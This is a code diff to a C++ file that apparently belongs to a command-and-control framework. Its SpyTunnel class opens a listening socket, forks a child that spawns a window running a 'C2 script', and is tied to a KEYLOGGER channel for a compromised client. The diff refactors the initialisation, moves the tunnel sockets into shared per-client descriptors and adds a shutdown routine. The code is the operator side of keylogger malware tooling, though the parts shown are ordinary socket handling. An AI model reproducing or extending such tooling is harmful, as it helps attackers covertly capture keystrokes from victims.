@@ -1,27 +1,28 @@
 #include "spy_tunnel.hpp"
 
-int SpyTunnel::init(std::string* __p_ip, uint* __p_port, int __client_index, std::atomic<bool>* __p_shutdown_flag, int __connection_type, int __shutdown_event_fd, std::vector<int>*__p_tunnel_shutdown_fds)
-{
+int SpyTunnel::init(std::string* __p_ip, 
+    uint __port,
+    ClientHandler* __p_client,
+    std::atomic<bool>* __p_shutdown_flag,
+    int __connection_type
+){
+    p_client_ = __p_client;
     p_ip_ = __p_ip;
-    p_port_ = __p_port;
-    client_index_ = __client_index;
+    port_ = __port;
     p_shutdown_flag_ = __p_shutdown_flag;
     connection_type_ = __connection_type;
-    shutdown_event_fd_ = __shutdown_event_fd;
-    p_tunnel_shutdown_fds_ = __p_tunnel_shutdown_fds;
-    socket_ = -1;
+    p_tunnel_fds_ = (*p_client_)[KEYLOGGER];
 
     return 0;
 }
 
-int SpyTunnel::run() {   
+// Runs in a thread
+int SpyTunnel::run() {
     pid_t pid = fork();
     if (pid < 0) {
         return -1;
     } else if (pid == 0) {
         // Child Process
-        close(shutdown_event_fd_);
-        close(socket_);
         spawn_window();
         std::cerr << RED << "[Server::handle_c2] Error executing C2 script: " << strerror(errno) << RESET;
         _exit(EXIT_FAILURE);
@@ -38,29 +39,29 @@ int SpyTunnel::run() {
     }
 
     int rc;
-    socket_ = socket(AF_INET, connection_type_, 0);
-    if (socket_ == -1) {
+    p_tunnel_fds_->tunnel_fd_ = socket(AF_INET, connection_type_, 0);
+    if (p_tunnel_fds_->tunnel_fd_ == -1) {
         goto cleanup;    
     }
     memset(&server_addr_, 0, sizeof(server_addr_));
     server_addr_.sin_family = AF_INET;
-    server_addr_.sin_port = htons(*p_port_);
+    server_addr_.sin_port = htons(port_);
     if (inet_pton(AF_INET, p_ip_->c_str(), &server_addr_.sin_addr) <= 0) {
         write_error(fifo, "Invalid IP address");
         goto cleanup;
     }
 
-    rc = bind(socket_, (const struct sockaddr*) &server_addr_, sizeof(server_addr_));
+    rc = bind(p_tunnel_fds_->tunnel_fd_, (const struct sockaddr*) &server_addr_, sizeof(server_addr_));
     if (rc < 0) {
         write_error(fifo, strerror(errno));
         goto cleanup;
     }
-    rc = listen(socket_, 1);
+    rc = listen(p_tunnel_fds_->tunnel_fd_, 1);
     if (rc < 0) {
         write_error(fifo, strerror(errno));
         goto cleanup;
     }
-    rc = accept(socket_, nullptr, nullptr);
+    rc = accept(p_tunnel_fds_->tunnel_fd_, nullptr, nullptr);
     if (rc < 0) {
         write_error(fifo, strerror(errno));
         goto cleanup;
@@ -73,8 +74,8 @@ cleanup:
     if (fifo >= 0) {
         close(fifo);
     }
-    if (socket_ != -1) {
-        close(socket_);
+    if (p_tunnel_fds_->tunnel_fd_ != -1) {
+        close(p_tunnel_fds_->tunnel_fd_);
     }
     if (pid > 0) {
         kill(pid, SIGTERM);
@@ -86,4 +87,13 @@ cleanup:
 void SpyTunnel::write_error(int fifo, const std::string& __msg) {
     std::string full_error_msg = "[__error__]: " + __msg + "\n";
     write(fifo, full_error_msg.c_str(), full_error_msg.size());
+}
+
+void SpyTunnel::shutdown() {
+    uint64_t u = 1;
+    write(p_tunnel_fds_->shutdown_fd_, &u, sizeof(u));
+    close(p_tunnel_fds_->tunnel_fd_);
+    close(p_tunnel_fds_->shutdown_fd_);
+    p_tunnel_fds_->tunnel_fd_ = -1;
+    p_tunnel_fds_->shutdown_fd_ = -1;
 }
